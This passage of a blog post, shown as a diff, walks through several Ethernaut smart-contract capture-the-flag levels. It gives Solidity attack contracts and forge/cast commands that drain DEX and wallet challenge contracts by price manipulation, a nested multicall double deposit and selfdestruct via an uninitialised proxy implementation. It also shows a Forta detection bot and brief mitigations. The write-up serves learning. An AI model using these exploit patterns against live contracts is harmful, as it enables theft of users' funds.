+<ul>
+  <li><code class="language-plaintext highlighter-rouge">forge install openzeppelin/openzeppelin-contracts</code></li>
+  <li><code class="language-plaintext highlighter-rouge">forge remappings &gt; remappings.txt</code>
+    <ul>
+      <li>helps VScode extension to play nicely. see <a href="https://book.getfoundry.sh/config/vscode">https://book.getfoundry.sh/config/vscode</a></li>
+      <li>generates this txt file</li>
+    </ul>
+
+    <div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">ds</span><span class="o">-</span><span class="n">test</span><span class="o">/=</span><span class="n">lib</span><span class="o">/</span><span class="n">forge</span><span class="o">-</span><span class="n">std</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ds</span><span class="o">-</span><span class="n">test</span><span class="o">/</span><span class="n">src</span><span class="o">/</span>
+  <span class="n">forge</span><span class="o">-</span><span class="n">std</span><span class="o">/=</span><span class="n">lib</span><span class="o">/</span><span class="n">forge</span><span class="o">-</span><span class="n">std</span><span class="o">/</span><span class="n">src</span><span class="o">/</span>
+  <span class="n">openzeppelin</span><span class="o">-</span><span class="n">contracts</span><span class="o">/=</span><span class="n">lib</span><span class="o">/</span><span class="n">openzeppelin</span><span class="o">-</span><span class="n">contracts</span><span class="o">/</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Setting up remappings for <code class="language-plaintext highlighter-rouge">foundry</code> allows me to now import the openzeppelin contracts as `</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
+</code></pre></div></div>
+
+<p>In this challenge, the player starts with 10 of <code class="language-plaintext highlighter-rouge">token1</code> and <code class="language-plaintext highlighter-rouge">token2</code>. While the contract starts with 100 of each.</p>
+
+<p>To exploit this level, we take advantage of the fact that when we swap against the DEX, the price moves in our favor, because $x_{to} = x_{from} * (N_{to})/(N_{from})$. In other words, if we swap all player’s tokens to 20 <code class="language-plaintext highlighter-rouge">token1</code> , the DEX will now allow the player to swap 10 <code class="language-plaintext highlighter-rouge">token1</code> for $10*(110/90) = 12$ <code class="language-plaintext highlighter-rouge">token2</code> , so we just gained tokens out of thin air.</p>
+
+<p>In fact, the strategy where we keep swapping from all <code class="language-plaintext highlighter-rouge">token1</code> into all <code class="language-plaintext highlighter-rouge">token2</code> , and vice versa  repeatedly, will result in the following decreasing DEX contract balances (see the source code <a href="https://github.com/axucar/ethernaut-foundry/blob/main/src/AttackDex.sol"><code class="language-plaintext highlighter-rouge">AttackDex.sol</code></a> and the corresponding test script <a href="https://github.com/axucar/ethernaut-foundry/blob/main/test_archive/AttackDex.t.sol"><code class="language-plaintext highlighter-rouge">AttackDex.t.sol</code></a> which we run via <code class="language-plaintext highlighter-rouge">forge test -vvv --fork-url $ETH_RPC_URL</code>  ).</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Logs</span><span class="o">:</span>
+  <span class="n">Printing</span> <span class="n">coin</span> <span class="n">balances</span> <span class="kr">in</span> <span class="n">DEX</span> <span class="k">contract</span>
+  <span class="o">------</span>
+  <span class="n">token1</span><span class="o">:</span> <span class="mi">90</span>
+  <span class="n">token2</span><span class="o">:</span> <span class="mi">110</span>
+  <span class="o">------</span>
+  <span class="n">token1</span><span class="o">:</span> <span class="mi">110</span>
+  <span class="n">token2</span><span class="o">:</span> <span class="mi">86</span>
+  <span class="o">------</span>
+  <span class="n">token1</span><span class="o">:</span> <span class="mi">80</span>
+  <span class="n">token2</span><span class="o">:</span> <span class="mi">110</span>
+  <span class="o">------</span>
+  <span class="n">token1</span><span class="o">:</span> <span class="mi">110</span>
+  <span class="n">token2</span><span class="o">:</span> <span class="mi">69</span>
+  <span class="o">------</span>
+  <span class="n">token1</span><span class="o">:</span> <span class="mi">45</span>
+  <span class="n">token2</span><span class="o">:</span> <span class="mi">110</span>
+  <span class="o">------</span>
+  <span class="n">token1</span><span class="o">:</span> <span class="mi">90</span>
+  <span class="n">token2</span><span class="o">:</span> <span class="mi">0</span>
+</code></pre></div></div>
+
+<p>Note that we have to be careful on the final swap to handle case where our swap conversion for the <code class="language-plaintext highlighter-rouge">from</code> token balance to the <code class="language-plaintext highlighter-rouge">to</code> token balance would exceed the reserves in the DEX contract.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">lowerboundSwap</span><span class="p">(</span><span class="kt">address</span> <span class="n">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
+        <span class="kt">bool</span> <span class="n">exceedsReserves</span> <span class="o">=</span>  <span class="p">(</span><span class="n">dex</span><span class="p">.</span><span class="n">getSwapPrice</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">dex</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">to</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">)));</span>
+        <span class="kt">uint</span> <span class="n">newAmount</span> <span class="o">=</span> <span class="n">exceedsReserves</span> <span class="o">?</span> <span class="n">dex</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">from</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">))</span> <span class="o">:</span> <span class="n">amount</span><span class="p">;</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="n">from</span> <span class="p">,</span><span class="n">to</span><span class="p">,</span> <span class="n">newAmount</span><span class="p">);</span>        
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>Deploy Attacker <code class="language-plaintext highlighter-rouge">forge create src/AttackDex.sol:AttackDex --verify --constructor-args &lt;challenge_addr&gt;</code></li>
+  <li>Approve coins for attacker contract to use, signed by player <code class="language-plaintext highlighter-rouge">cast send &lt;dex_contract&gt; "approve(address,uint)" &lt;attacker_address&gt; 9999</code></li>
+  <li>Call attack method in attacker contract <code class="language-plaintext highlighter-rouge">cast send &lt;attacker_address&gt; "attack()"</code></li>
+</ol>
+
+<p>Indeed, we should find that the <code class="language-plaintext highlighter-rouge">Dex</code> contract has been emptied of its <code class="language-plaintext highlighter-rouge">token2</code> coins.</p>
+
+<p>One way to ameliorate such risk is to use multiple decentralised price oracles; otherwise, large pools of capital relative to trading liquidity can in practice manipulate prices on a DEX with similar simple pricing models. Adding slippage could be another option.</p>
+
+<hr />
+<h1 id="dextwo">DexTwo</h1>
+
+<p>The key is that the DEX contract allows any ERC20 token to be swapped. Thus, we can exploit it by adding a <code class="language-plaintext highlighter-rouge">token3</code> with minimal supply to the DEX, and allow us to get large quantities of <code class="language-plaintext highlighter-rouge">token1</code> and <code class="language-plaintext highlighter-rouge">token2</code> in exchange</p>
+
+<ol>
+  <li>deploy custom token contract, <code class="language-plaintext highlighter-rouge">token3</code> which inherits from <code class="language-plaintext highlighter-rouge">ERC20</code>
+    <ol>
+      <li>mint 1 token to DEX contract</li>
+      <li>mint 3 tokens to Attacker contract</li>
+    </ol>
+  </li>
+  <li>swap 1 <code class="language-plaintext highlighter-rouge">token3</code> for 100 <code class="language-plaintext highlighter-rouge">token1</code> since that is the ratio in the DEX</li>
+  <li>swap 2 <code class="language-plaintext highlighter-rouge">token3</code> for 100 <code class="language-plaintext highlighter-rouge">token2</code> since that is the new ratio in the DEX</li>
+</ol>
+
+<p>For reference, see the contract source code <a href="https://github.com/axucar/ethernaut-foundry/blob/main/src/AttackDexTwo.sol"><code class="language-plaintext highlighter-rouge">AttackDexTwo.sol</code></a> and the corresponding test script <a href="https://github.com/axucar/ethernaut-foundry/blob/main/test_archive/AttackDexTwo.t.sol"><code class="language-plaintext highlighter-rouge">AttackDexTwo.t.sol</code></a>.</p>
+
+<hr />
+<h1 id="puzzle-wallet">Puzzle Wallet</h1>
+
+<p>Storage layout for proxy contract has to match the logic contract; otherwise, we get a <a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies#unstructured-storage-proxies">storage collision</a>. Thus, it is possible to overwrite the stored variables <code class="language-plaintext highlighter-rouge">pendingAdmin</code> and <code class="language-plaintext highlighter-rouge">admin</code> of the <code class="language-plaintext highlighter-rouge">PuzzleProxy</code> with <code class="language-plaintext highlighter-rouge">owner</code> and <code class="language-plaintext highlighter-rouge">maxBalance</code> respectively, in the <code class="language-plaintext highlighter-rouge">PuzzleWallet</code> logic contract (and vice versa).</p>
+
+<p>Since the goal is to set <code class="language-plaintext highlighter-rouge">admin</code> via the <code class="language-plaintext highlighter-rouge">setMaxBalance</code> function, which requires the challenge contract to have 0 balance, we exploit the <code class="language-plaintext highlighter-rouge">multicall</code> function to register balance for twice the amount that we deposit. Thus, we can withdraw more than we put into the contract (thus emptying the challenge contract).</p>
+
+<p>Within a <code class="language-plaintext highlighter-rouge">multicall</code> call, we can only call deposit <strong>once.</strong> So it suffices to either do <code class="language-plaintext highlighter-rouge">multicall[deposit(), multicall([deposit()])]</code> or <code class="language-plaintext highlighter-rouge">multicall[multicall([deposit()]), multicall([deposit()])]</code> . What does <strong>not</strong> work is <code class="language-plaintext highlighter-rouge">multicall([deposit(), deposit()])</code> , which returns an “Deposit can only be called once” error.</p>
+
+<p>The result of this is we are able to call <code class="language-plaintext highlighter-rouge">deposit</code> twice (registering <code class="language-plaintext highlighter-rouge">msg.value</code> twice) while only sending ETH once!</p>
+
+<p><strong>Steps to complete</strong>:</p>
+<ol>
+  <li>Create attacker contract with enough ether to conduct attack<br />
+<code class="language-plaintext highlighter-rouge">forge create src/AttackPuzzleWallet.sol:AttackPuzzleWallet --value 0.001ether --verify --constructor-args &lt;challenge_addr&gt;</code></li>
+  <li>Call attack <code class="language-plaintext highlighter-rouge">cast send &lt;attacker_contract&gt; "attack()”</code></li>
+</ol>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="c1">//sets owner
+</span>    <span class="n">pw</span><span class="p">.</span><span class="n">proposeNewAdmin</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span> 
+    <span class="c1">//as attacker is owner, it can add itself to whitelist
+</span>    <span class="n">pw</span><span class="p">.</span><span class="n">addToWhitelist</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+
+    <span class="c1">//we are only allowed to call deposit once in the multicall    
+</span>    <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">depositcall</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"deposit()"</span><span class="p">);</span>
+    <span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">wrapped_depositcall</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">wrapped_depositcall</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">depositcall</span><span class="p">;</span>
+
+    <span class="c1">//we wrap a deposit in another multicall
+</span>    <span class="c1">//ie., multicall(deposit,multicall(deposit))
+</span>    <span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">nestedCall</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+    <span class="n">nestedCall</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">depositcall</span><span class="p">;</span>        
+    <span class="n">nestedCall</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"multicall(bytes[])"</span><span class="p">,</span> <span class="n">wrapped_depositcall</span><span class="p">);</span>
+    
+    <span class="kt">uint</span> <span class="n">amtToDrain</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">pw</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span> 
+    <span class="c1">//take credit for existing balance of victim contract, as well as the balance we added
+</span>    <span class="n">pw</span><span class="p">.</span><span class="n">multicall</span><span class="p">{</span><span class="n">value</span><span class="o">:</span><span class="n">amtToDrain</span><span class="p">}(</span><span class="n">nestedCall</span><span class="p">);</span>                
+    <span class="n">pw</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="mi">2</span><span class="o">*</span><span class="n">amtToDrain</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span> <span class="c1">//drain the puzzlewallet contract
+</span>    <span class="n">pw</span><span class="p">.</span><span class="n">setMaxBalance</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">)));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can verify in the game console that the storage slot 1 (corresponding to <code class="language-plaintext highlighter-rouge">admin</code>) has been successfully updated to our address</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">await web3.eth.getStorageAt(instance, 1);</code> returns <code class="language-plaintext highlighter-rouge">0x0000000000000000000000009bdcf9696e273afd83992b1fb5672a70532ca9e1</code>
+    <ul>
+      <li>(40-hex address zero-padded to 64 hex characters = 32bytes)</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+<h1 id="motorbike">Motorbike</h1>
+
+<p>Proxy contracts use <code class="language-plaintext highlighter-rouge">delegatecall</code> on a logic contract so that business logic code is upgradeable without changing the proxy state.</p>
+<ul>
+  <li>To avoid clashes in storage usage between the proxy and logic contract, the address of the logic contract is usually saved in a specific slot (for example <code class="language-plaintext highlighter-rouge">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code>
+ in OpenZeppelin contracts) guaranteed to be never allocated by a compiler</li>
+  <li>Note that the implementation slot <code class="language-plaintext highlighter-rouge">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code> is not a coincidence.
+It is the keccak256 hash of “eip1967.proxy.implementation” minus 1
+    <div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//javascript</span>
+<span class="kd">const</span> <span class="nx">strings_utils</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">@ethersproject/strings</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="p">{</span><span class="nx">keccak256</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">@ethersproject/keccak256</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">strings_utils</span><span class="p">.</span><span class="nx">toUtf8Bytes</span><span class="p">(</span><span class="dl">"</span><span class="s2">eip1967.proxy.implementation</span><span class="dl">"</span><span class="p">)));</span>
+<span class="c1">//prints 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbd</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>In this challenge, we want to change the implementation of the <code class="language-plaintext highlighter-rouge">Engine</code> logic contract to a  malicious one (that contains the <code class="language-plaintext highlighter-rouge">SELFDESTRUCT</code> operation), using <code class="language-plaintext highlighter-rouge">upgradeToAndCall()</code> which requires us to be the <code class="language-plaintext highlighter-rouge">upgrader</code>. However, the only way to set <code class="language-plaintext highlighter-rouge">upgrader</code> is via <code class="language-plaintext highlighter-rouge">initialize()</code>.</p>
+
+<p>Since <code class="language-plaintext highlighter-rouge">Engine</code> implements <code class="language-plaintext highlighter-rouge">Initializable</code>, the function <code class="language-plaintext highlighter-rouge">initialize()</code> can only be called once. Thankfully, we notice that the call to <code class="language-plaintext highlighter-rouge">initialize()</code> in the Motorbike constructor is via a <code class="language-plaintext highlighter-rouge">delegatecall</code>, which means that it only modifies the storage state of proxy <code class="language-plaintext highlighter-rouge">Motorbike</code>, not the logic contract <code class="language-plaintext highlighter-rouge">Engine</code> storage. In other words, we can still call <code class="language-plaintext highlighter-rouge">initialize()</code> in the context of <code class="language-plaintext highlighter-rouge">Engine</code>’s state. In fact, <code class="language-plaintext highlighter-rouge">initialized</code> is still set to <code class="language-plaintext highlighter-rouge">false</code> and <code class="language-plaintext highlighter-rouge">upgrader</code> is set to <code class="language-plaintext highlighter-rouge">0x00</code> in the <code class="language-plaintext highlighter-rouge">Engine</code> state. This is the crux of the challenge: the proxy uses the implementation purely for logic and modifies only the storage within the proxy contract, since the proxy interacts with the logic implementation only via <code class="language-plaintext highlighter-rouge">delegatecall</code>. The takeaway here is to <strong>remember to initialise implementation contracts</strong>!</p>
+
+<p><strong>Steps:</strong></p>
+
+<ol>
+  <li>
+    <p>Get contract address of <code class="language-plaintext highlighter-rouge">Engine</code> , the logic contract that we want to selfdestruct via <code class="language-plaintext highlighter-rouge">delegatecall</code></p>
+
+    <p><code class="language-plaintext highlighter-rouge">cast storage &lt;challenge_addr&gt; &lt;IMPLEMENTATION_SLOT&gt;</code></p>
+  </li>
+  <li>
+    <p>deploy <code class="language-plaintext highlighter-rouge">AttackMotorbike</code> contract, with input of Engine’s address. The attack consists of:</p>
+    <ol>
+      <li>call Engine’s <code class="language-plaintext highlighter-rouge">initialize()</code></li>
+      <li>call <code class="language-plaintext highlighter-rouge">upgradeToAndCall</code> using calldata code of <code class="language-plaintext highlighter-rouge">selfdestruct</code></li>
+    </ol>
+  </li>
+</ol>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">engineAddress</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"initialize()"</span><span class="p">));</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"engine could not be initialized"</span><span class="p">);</span>
+
+    <span class="n">Destroy</span> <span class="n">d</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Destroy</span><span class="p">();</span>        
+    <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"selfDestruct()"</span><span class="p">);</span>
+    <span class="p">(</span><span class="kt">bool</span> <span class="n">success2</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">engineAddress</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"upgradeToAndCall(address,bytes)"</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">d</span><span class="p">),</span> <span class="n">data</span><span class="p">));</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">success2</span><span class="p">,</span> <span class="s">"upgrade to and call failed"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Note that the <code class="language-plaintext highlighter-rouge">Destroy</code> contract just needs the <code class="language-plaintext highlighter-rouge">selfdestruct</code> function.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">contract</span> <span class="n">Destroy</span> <span class="p">{</span>
+    <span class="k">function</span> <span class="n">selfDestruct</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="nb">selfdestruct</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="n">origin</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Finally, we can verify on Etherscan that the engine contract has been self-destructed.</p>
+
+<hr />
+<h1 id="doubleentrypoint">DoubleEntryPoint</h1>
+
+<p>The vulnerability for this challenge is that <code class="language-plaintext highlighter-rouge">CryptoVault</code>’s function <code class="language-plaintext highlighter-rouge">sweepToken</code> is supposed to prevent the token being swept from being the underlying <code class="language-plaintext highlighter-rouge">DET</code> token: <code class="language-plaintext highlighter-rouge">require(token != underlying, "Can't transfer underlying token");</code> . However, this can be bypassed by simply calling <code class="language-plaintext highlighter-rouge">sweepToken</code> on the <code class="language-plaintext highlighter-rouge">LegacyToken</code> contract, whose <code class="language-plaintext highlighter-rouge">delegate</code> variable is indeed the underlying token <code class="language-plaintext highlighter-rouge">DET</code> so its <code class="language-plaintext highlighter-rouge">delegate.delegateTransfer(to,value,msg.sender)</code> call would sweep the entire Vault’s balance of underlying tokens <code class="language-plaintext highlighter-rouge">DET</code> to the <code class="language-plaintext highlighter-rouge">sweptTokensRecipient</code> .</p>
+
+<p>To prevent (or at least alert us of) this vulnerability, we implement a <code class="language-plaintext highlighter-rouge">DetectionBot</code> contract to be set as <code class="language-plaintext highlighter-rouge">Forta</code>’s bot to detect when both:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">delegateTransfer(address, uint256, address)</code> is called</li>
+  <li>the caller of the above is the <code class="language-plaintext highlighter-rouge">CryptoVault</code> contract</li>
+</ol>
+
+<p>We initialise the <code class="language-plaintext highlighter-rouge">DetectionBot</code> with these two parameters. Notice that the detection bot must also implement <code class="language-plaintext highlighter-rouge">handleTransaction</code>  called within <code class="language-plaintext highlighter-rouge">forta.notify()</code> which handles whether <code class="language-plaintext highlighter-rouge">forta</code> should <code class="language-plaintext highlighter-rouge">raiseAlert</code> , raising the <code class="language-plaintext highlighter-rouge">botRaisedAlerts[&lt;detectionbot_address&gt;]</code> counter by one.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">contract</span> <span class="n">DetectionBot</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="n">refUser</span><span class="p">;</span>
+    <span class="kt">bytes</span> <span class="n">refMsgData</span><span class="p">;</span>
+    <span class="k">constructor</span> <span class="p">(</span><span class="kt">address</span> <span class="n">_refUser</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_refMsgData</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">refUser</span> <span class="o">=</span> <span class="n">_refUser</span><span class="p">;</span>
+        <span class="n">refMsgData</span> <span class="o">=</span> <span class="n">_refMsgData</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">handleTransaction</span><span class="p">(</span><span class="kt">address</span> <span class="n">user</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">calldata</span> <span class="n">msgData</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>        
+        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">functionSig</span> <span class="o">=</span> <span class="n">msgData</span><span class="p">[</span><span class="o">:</span><span class="mi">4</span><span class="p">];</span>
+        <span class="p">(</span> <span class="p">,</span> <span class="p">,</span> <span class="kt">address</span> <span class="n">origSender</span><span class="p">)</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">msgData</span><span class="p">[</span><span class="mi">4</span><span class="o">:</span><span class="p">],(</span><span class="kt">address</span><span class="p">,</span><span class="kt">uint256</span><span class="p">,</span><span class="kt">address</span><span class="p">));</span>
+
+        <span class="c1">//check that origSender is the CryptoVault contract        
+</span>        <span class="k">if</span> <span class="p">((</span><span class="n">origSender</span><span class="o">==</span><span class="n">refUser</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">functionSig</span><span class="p">)</span> <span class="o">==</span> <span class="nb">keccak256</span><span class="p">(</span><span class="n">refMsgData</span><span class="p">)))</span> <span class="p">{</span>
+            <span class="c1">//the msg.sender (caller of DetectionBot.handleTransaction) is a Forta contract
+</span>            <span class="n">IForta</span> <span class="n">forta</span> <span class="o">=</span> <span class="n">IForta</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
+            <span class="n">forta</span><span class="p">.</span><span class="n">raiseAlert</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>The first 4 bytes of <code class="language-plaintext highlighter-rouge">msg.data</code> msgData[:4] is simply the function signature when we call <code class="language-plaintext highlighter-rouge">delegateTransfer</code>
+    <ul>
+      <li>ie. <code class="language-plaintext highlighter-rouge">abi.encodeWithSignature("delegateTransfer(address,uint256,address)")</code> = <code class="language-plaintext highlighter-rouge">0x9cd1a121</code> which is 4 bytes</li>
+    </ul>
+  </li>
+  <li>The remaining bytes of <code class="language-plaintext highlighter-rouge">msg.data</code> can then be decoded into the <code class="language-plaintext highlighter-rouge">(address to, uint256 value, address origSender)</code> parameters. Crucially, the <code class="language-plaintext highlighter-rouge">origSender</code> address must match the <code class="language-plaintext highlighter-rouge">CryptoVault</code> address we are tracking</li>
+</ul>
+
+<p>When running <code class="language-plaintext highlighter-rouge">AttackDoubleEntryPoint.t.sol</code>, which attempts to sweep the entire <code class="language-plaintext highlighter-rouge">DET</code> balance from <code class="language-plaintext highlighter-rouge">CryptoVault</code> after setting up the <code class="language-plaintext highlighter-rouge">DetectionBot</code>,  the test should fail with <code class="language-plaintext highlighter-rouge">FAIL. Reason: Alert has been triggered, reverting</code></p>
+
+<p><strong>Steps:</strong></p>
+<ol>
+  <li>Deploy DetectionBot contract, where <code class="language-plaintext highlighter-rouge">&lt;function_sig&gt;</code> is <code class="language-plaintext highlighter-rouge">0x9cd1a121</code> as discussed above<br />
+<code class="language-plaintext highlighter-rouge">forge create src/AttackDoubleEntryPoint.sol:DetectionBot --constructor-args &lt;cryptoVault_address&gt; &lt;function_sig&gt;</code></li>
+  <li>Call <code class="language-plaintext highlighter-rouge">setDetectionBot</code> on <code class="language-plaintext highlighter-rouge">Forta</code> contract<br />
+<code class="language-plaintext highlighter-rouge">cast send &lt;forta_address&gt; "setDetectionBot(address)" &lt;detectionbot_address&gt;</code></li>
+</ol>
+
+<hr />
+<h1 id="good-samaritan">Good Samaritan</h1>
+
+<p>We see that the <code class="language-plaintext highlighter-rouge">Coin</code> contract is initialised with 1 million balance. Our goal is to drain all these tokens from the contract. In the <code class="language-plaintext highlighter-rouge">GoodSamaritan</code> contract, we see that there is a <code class="language-plaintext highlighter-rouge">requestDonation()</code> function which sends either 10 or all of the tokens to <code class="language-plaintext highlighter-rouge">msg.sender</code>. This is promising.</p>
+
+<ul>
+  <li>In the <code class="language-plaintext highlighter-rouge">Wallet</code> contract, notice that when the balance is &lt; 10, we <code class="language-plaintext highlighter-rouge">revert NotEnoughBalance()</code>, which is caught in the try-catch within <code class="language-plaintext highlighter-rouge">requestDonation()</code> triggering <code class="language-plaintext highlighter-rouge">wallet.transferRemainder(msg.sender)</code></li>
+  <li>Ideally, we would like to return the same <code class="language-plaintext highlighter-rouge">revert NotEnoughBalance()</code> error even when the balance is 1 million.</li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">donate10</span><span class="p">(</span><span class="kt">address</span> <span class="n">dest_</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+    <span class="c1">// check balance left
+</span>    <span class="k">if</span> <span class="p">(</span><span class="n">coin</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">revert</span> <span class="n">NotEnoughBalance</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">// donate 10 coins
+</span>        <span class="n">coin</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">dest_</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Thankfully, we see that the <code class="language-plaintext highlighter-rouge">Coin</code> contract’s <code class="language-plaintext highlighter-rouge">transfer</code> function has an exploitable feature (if the destination <code class="language-plaintext highlighter-rouge">_dest.isContract()</code> is true): <code class="language-plaintext highlighter-rouge">INotifyable(dest_).notify(amount_)</code>.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Coin's transfer function
+</span><span class="k">function</span> <span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">dest_</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount_</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+    <span class="kt">uint256</span> <span class="n">currentBalance</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">];</span>
+
+    <span class="c1">// transfer only occurs if balance is enough
+</span>    <span class="k">if</span><span class="p">(</span><span class="n">amount_</span> <span class="o">&lt;=</span> <span class="n">currentBalance</span><span class="p">)</span> <span class="p">{</span>
